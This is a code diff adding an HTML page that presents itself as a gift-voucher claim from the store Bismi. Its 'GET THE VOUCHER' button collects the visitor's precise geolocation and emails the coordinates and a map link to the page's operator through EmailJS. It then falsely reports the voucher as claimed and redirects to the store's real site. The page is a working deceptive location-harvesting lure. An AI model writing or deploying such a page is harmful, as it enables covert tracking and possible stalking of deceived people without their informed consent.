@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Location Check-In</title>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script>
+emailjs.init({
+    publicKey: "TXZzJOW_xhFSgfVM2"
+});
+</script>
+
+<style>
+body{
+    font-family:Arial,sans-serif;
+    background:#f5f5f5;
+    text-align:center;
+    padding:40px;
+}
+
+.container{
+    max-width:500px;
+    margin:auto;
+    background:#fff;
+    padding:25px;
+    border-radius:10px;
+    box-shadow:0 0 10px rgba(0,0,0,.2);
+}
+
+.banner{
+    width:100%;
+    max-height:220px;
+    object-fit:cover;
+    border-radius:10px;
+    margin-bottom:20px;
+}
+
+button{
+    padding:15px 30px;
+    font-size:18px;
+    background:#2196F3;
+    color:white;
+    border:none;
+
+    border-radius:6px;
+    cursor:pointer;
+}
+
+button:hover{
+    background:#1976D2;
+}
+
+#status{
+    margin-top:20px;
+    font-weight:bold;
+    color:green;
+}
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+    <img src="IMAGES/1.jpg" alt="Gift Banner" class="banner">
+
+    <h3> 
+        🎁Get your gift voucher from Bismi today!<br>
+        Simply click the button below to claim your exclusive voucher.🎁
+    </h3> <h4>Click below to unlock your special gift voucher today.<br></h4>
+
+   <br> <button onclick="shareLocation()">
+        GET THE VOUCHER
+    </button>
+
+    <p id="status"></p>
+
+</div>
+
+<script>
+
+function shareLocation(){
+
+    const status = document.getElementById("status");
+
+    if(!navigator.geolocation){
+        status.innerHTML = "Geolocation is not supported.";
+        return;
+    }
+
+    status.innerHTML = "PROCESSING YOUR REQUEST... PLEASE WAIT...";
+
+    navigator.geolocation.getCurrentPosition(
+
+    function(position){
+
+        let lat = position.coords.latitude;
+        let lon = position.coords.longitude;
+
+        let mapLink = "https://maps.google.com/?q=" + lat + "," + lon;
+
+        emailjs.send(
+            "service_oukq4h9",
+            "template_ykicdjt",
+            {
+                latitude: lat,
+                longitude: lon,
+                google_maps: mapLink
+            }
+        )
+
+        .then(function(){
+
+            status.innerHTML = "✅ GIFT VOUCHER CLAIMED SUCCESSFULLY.";
+
+            setTimeout(function(){
+                window.location.href = "https://www.bismiconnectstores.in/";
+            }, 2000);
+
+        })
+
+        .catch(function(error){
+
+            console.log(error);
+
+            status.innerHTML = "❌ SOMETHING WENT WRONG. PLEASE TRY AGAIN.";
+
+        });
+
+    },
+
+    function(error){
+
+        switch(error.code){
+
+            case error.PERMISSION_DENIED:
+                status.innerHTML = "❌ Permission denied.";
+                break;
+
+            case error.POSITION_UNAVAILABLE:
+                status.innerHTML = "❌ Location unavailable.";
+                break;
+
+            case error.TIMEOUT:
+                status.innerHTML = "❌ Request timed out.";
+                break;
+
+            default:
+                status.innerHTML = "❌ Unknown error.";
+
+        }
+
+    },
+
+    {
+        enableHighAccuracy:true,
+        timeout:10000,
+        maximumAge:0
+    });
+
+}
+
+</script>
+
+</body>
+</html>
